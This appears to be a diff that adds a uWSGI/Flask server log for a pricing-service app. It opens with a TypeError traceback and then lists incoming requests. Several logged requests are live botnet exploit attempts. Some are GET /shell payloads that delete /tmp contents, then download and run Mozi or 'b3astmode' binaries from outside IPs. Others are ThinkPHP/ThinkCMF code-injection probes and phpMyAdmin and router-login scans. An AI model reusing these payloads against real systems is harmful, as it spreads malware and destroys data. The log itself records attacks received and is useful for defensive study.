+    response = self.full_dispatch_request()
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1834, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1737, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/_compat.py", line 36, in reraise
+    raise value
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1832, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1818, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/var/www/html/pricing-service/models/user/decorators.py", line 12, in decorated_function
+    return f(*args, **kwargs)
+  File "/var/www/html/pricing-service/views/alerts.py", line 24, in create_alert
+    store = Store.find_by_url(item_url)
+  File "/var/www/html/pricing-service/models/store.py", line 46, in find_by_url
+    return cls.get_by_url_prefix(url_prefix)
+  File "/var/www/html/pricing-service/models/store.py", line 34, in get_by_url_prefix
+    return cls.find_one_by("url_prefix", url_regex)
+  File "/var/www/html/pricing-service/models/model.py", line 36, in find_one_by
+    return cls(**Database.find_one(cls.collection, {attribute: value}))
+TypeError: ABCMeta object argument after ** must be a mapping, not NoneType
+[pid: 28725|app: 0|req: 1/83] 89.36.118.19 () {52 vars in 1132 bytes} [Fri Sep 11 15:38:51 2020] POST /alerts/new => generated 290 bytes in 12 msecs (HTTP/1.1 500) 2 headers in 84 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 28770|app: 0|req: 15/84] 94.102.51.119 () {40 vars in 564 bytes} [Fri Sep 11 18:00:08 2020] GET / => generated 2460 bytes in 4 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 2)
+[pid: 28770|app: 0|req: 16/85] 94.102.51.119 () {40 vars in 564 bytes} [Fri Sep 11 19:17:08 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 1)
+[pid: 28771|app: 0|req: 41/86] 23.90.145.50 () {26 vars in 276 bytes} [Fri Sep 11 19:20:09 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 28771|app: 0|req: 42/87] 192.241.223.18 () {34 vars in 419 bytes} [Fri Sep 11 19:47:49 2020] GET /portal/redlion => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 28771|app: 0|req: 43/88] 73.244.72.120 () {28 vars in 304 bytes} [Fri Sep 11 19:49:33 2020] GET / => generated 2460 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 28771|app: 0|req: 44/89] 222.240.34.3 () {34 vars in 637 bytes} [Fri Sep 11 20:03:02 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 5)
+[pid: 28771|app: 0|req: 45/90] 84.75.198.95 () {34 vars in 548 bytes} [Fri Sep 11 21:02:32 2020] GET /phpmyadmin/index.php?lang=en => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 4)
+[pid: 28770|app: 0|req: 17/91] 84.75.198.95 () {34 vars in 548 bytes} [Fri Sep 11 21:02:33 2020] GET /phpMyadmin/index.php?lang=en => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 28725|app: 0|req: 2/92] 84.75.198.95 () {34 vars in 548 bytes} [Fri Sep 11 21:02:36 2020] GET /phpMyAdmin/index.php?lang=en => generated 232 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 28727|app: 0|req: 6/93] 84.75.198.95 () {34 vars in 548 bytes} [Fri Sep 11 21:02:37 2020] GET /phpmyAdmin/index.php?lang=en => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 5)
+[pid: 28771|app: 0|req: 46/94] 84.75.198.95 () {34 vars in 538 bytes} [Fri Sep 11 21:02:40 2020] GET /mysql/index.php?lang=en => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 4)
+[pid: 28771|app: 0|req: 47/95] 84.75.198.95 () {34 vars in 544 bytes} [Fri Sep 11 21:02:41 2020] GET /database/index.php?lang=en => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 7)
+[pid: 28771|app: 0|req: 48/96] 186.47.153.190 () {32 vars in 461 bytes} [Fri Sep 11 21:04:28 2020] GET / => generated 2460 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 7)
+[pid: 28771|app: 0|req: 49/97] 51.254.59.113 () {32 vars in 447 bytes} [Fri Sep 11 22:54:52 2020] GET / => generated 2460 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 7)
+[pid: 28771|app: 0|req: 50/98] 185.172.110.223 () {40 vars in 627 bytes} [Fri Sep 11 23:28:23 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 7)
+[pid: 28771|app: 0|req: 51/99] 128.14.133.58 () {34 vars in 484 bytes} [Fri Sep 11 23:32:24 2020] GET / => generated 2460 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 7)
+[pid: 28771|app: 0|req: 52/100] 45.148.10.28 () {48 vars in 874 bytes} [Sat Sep 12 00:34:25 2020] POST /boaform/admin/formLogin => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 5)
+[pid: 28771|app: 0|req: 53/101] 103.145.13.124 () {34 vars in 400 bytes} [Sat Sep 12 01:32:07 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 5)
+[pid: 28771|app: 0|req: 54/102] 14.102.9.2 () {32 vars in 457 bytes} [Sat Sep 12 01:42:24 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 4)
+Sat Sep 12 01:56:25 2020 - uwsgi_response_writev_headers_and_body_do(): Broken pipe [core/writer.c line 306] during GET /shell?cd+/tmp;rm+-rf+*;wget+149.3.170.181/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws (156.220.242.121)
+OSError: write error
+[pid: 28771|app: 0|req: 55/103] 156.220.242.121 () {34 vars in 698 bytes} [Sat Sep 12 01:56:25 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+149.3.170.181/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws => generated 0 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 0 bytes (0 switches on core 4)
+[pid: 28771|app: 0|req: 56/104] 88.199.82.10 () {32 vars in 459 bytes} [Sat Sep 12 02:33:27 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 4)
+[pid: 28771|app: 0|req: 57/105] 94.102.51.119 () {40 vars in 564 bytes} [Sat Sep 12 03:15:18 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 2)
+[pid: 28771|app: 0|req: 58/106] 167.248.133.35 () {28 vars in 308 bytes} [Sat Sep 12 05:02:44 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 28724|app: 0|req: 8/107] 167.248.133.35 () {34 vars in 440 bytes} [Sat Sep 12 05:02:44 2020] GET / => generated 2460 bytes in 3 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 7)
+[pid: 28771|app: 0|req: 59/108] 162.142.125.36 () {28 vars in 308 bytes} [Sat Sep 12 05:11:59 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 28724|app: 0|req: 9/109] 162.142.125.36 () {34 vars in 440 bytes} [Sat Sep 12 05:11:59 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 28771|app: 0|req: 60/110] 110.153.68.119 () {34 vars in 643 bytes} [Sat Sep 12 05:15:24 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+http://172.36.16.96:40627/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[pid: 28771|app: 0|req: 61/111] 74.120.14.52 () {28 vars in 306 bytes} [Sat Sep 12 05:17:22 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 28770|app: 0|req: 18/112] 74.120.14.52 () {34 vars in 438 bytes} [Sat Sep 12 05:17:23 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+[pid: 28770|app: 0|req: 19/113] 45.148.10.28 () {48 vars in 874 bytes} [Sat Sep 12 06:02:58 2020] POST /boaform/admin/formLogin => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 7)
+[pid: 28770|app: 0|req: 20/114] 154.221.31.143 () {34 vars in 506 bytes} [Sat Sep 12 06:21:27 2020] GET /manager/html => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 7)
+[pid: 28770|app: 0|req: 21/115] 71.6.232.2 () {34 vars in 481 bytes} [Sat Sep 12 06:54:13 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 3)
+[pid: 28770|app: 0|req: 22/116] 115.96.166.134 () {34 vars in 648 bytes} [Sat Sep 12 06:59:40 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+http://115.96.166.134:56215/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 28770|app: 0|req: 23/117] 195.54.160.21 () {34 vars in 552 bytes} [Sat Sep 12 07:00:28 2020] GET /solr/admin/info/system?wt=json => generated 232 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 28770|app: 0|req: 24/118] 195.54.160.21 () {34 vars in 552 bytes} [Sat Sep 12 07:16:35 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 2460 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 3)
+[pid: 28770|app: 0|req: 25/119] 195.54.160.21 () {36 vars in 649 bytes} [Sat Sep 12 07:34:52 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 3)
+[pid: 28771|app: 0|req: 62/120] 195.54.160.21 () {34 vars in 712 bytes} [Sat Sep 12 07:42:01 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
